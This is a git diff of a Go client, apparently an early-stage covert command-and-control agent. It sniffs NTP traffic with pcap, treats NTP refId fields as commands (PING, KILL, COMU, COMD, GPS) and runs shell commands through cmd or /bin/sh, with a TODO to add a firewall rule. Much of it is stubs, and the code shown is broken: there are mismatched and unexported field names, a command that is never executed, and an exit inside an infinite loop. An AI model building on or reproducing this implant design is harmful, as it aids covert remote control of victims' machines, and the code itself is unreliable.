@@ -2,48 +2,53 @@ package main
 
 import (
 	"fmt"
+	"os"
 	"os/exec"
-	"runtime"
 	//"strings"
+	//"bytes"
+	//"log"
+
+	//"mesa/client/pkg/ntppacket"
+	"mesa/client/pkg/listener"
+	"mesa/client/pkg/agent"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/pcap"
 )
 
-/*
-func init(){
-    sys := "Unknown"
-	if runtime.GOOS == "windows" {
-		sys = "Windows"
-	} else if runtime.GOOS == "linux" {
-		sys = "Linux"
-	} else if runtime.GOOS == "darwin" {
-		sys = "MacOS"
+var newAgent agent.Agent
 
-}*/
+func init(){
+    newAgent = agent.Agent{}
+	newAgent.opsys, newAgent.shellType, newAgent.shellFlag = agent.detectOS()
+	newAgent.iface = agent.getNetAdapter(newAgent.shellType, newAgent.shellFlag)
+	newAgent.serverIP = agent.getServerIP()
+	newAgent.myIP = agent.getMyIP(newAgent.iface)
+}
 
 func main() {
-	//NTP server ip passed as an argument when building? arguments in makefile?
+	//NTP server ip passed as an argument when building?
     fmt.Println("hello world!")
-	runCMD("echo hello world")
+	exec.Command(newAgent.shellType, newAgent.ShellFlag, "ifconfig")
+	
+	for { //program runs until break
+		os.Exit(0)
+	}
+	
+
+	
+		
 }
 
 
-func setup() {
-	//set up NTP configurations, based on windows or linux
-}
-
-
-func resync() { //run on 1 minute timer, also called by listenForServer()
-
-}
-
-
-func runCMD(command string) {
+func runCMD(command string, agent Agent) {
 	var startType string
 	var flag string
 
-	if runtime.GOOS == "windows"{
+	if agent.opsys == "windows"{
 		startType = "cmd"
 		flag = "/c"
-	} else{
+	} else {
 		startType = "/bin/sh"
 		flag = "-c"
 	}
@@ -56,31 +61,6 @@ func runCMD(command string) {
 	fmt.Println(string(output))
 }
 
-
-func listenForServer() { //sniffs for NTP server traffic 
-	
-	//packet received, call decoder
-	
-}
-
-
-func extractInformation() { // (PING, KILL, COMU, COMD, GPS)
-	
-	
-	refId := "temp" //actually parsed 
-	
-	if refId == "PING" {
-		//something
-	}else if refId == "COMU" {
-		//something
-	}else if refId == "COMD" {
-		//something
-	}else if refId == "GPS" {
-		//something
-	}else {
-		//???
-	}
-}
 
 
 /*raw sockets
@@ -107,3 +87,4 @@ TODO agent is compiled for specific os, sends initial ping
 */
 
 
+//TODO add firewall command rule in setup
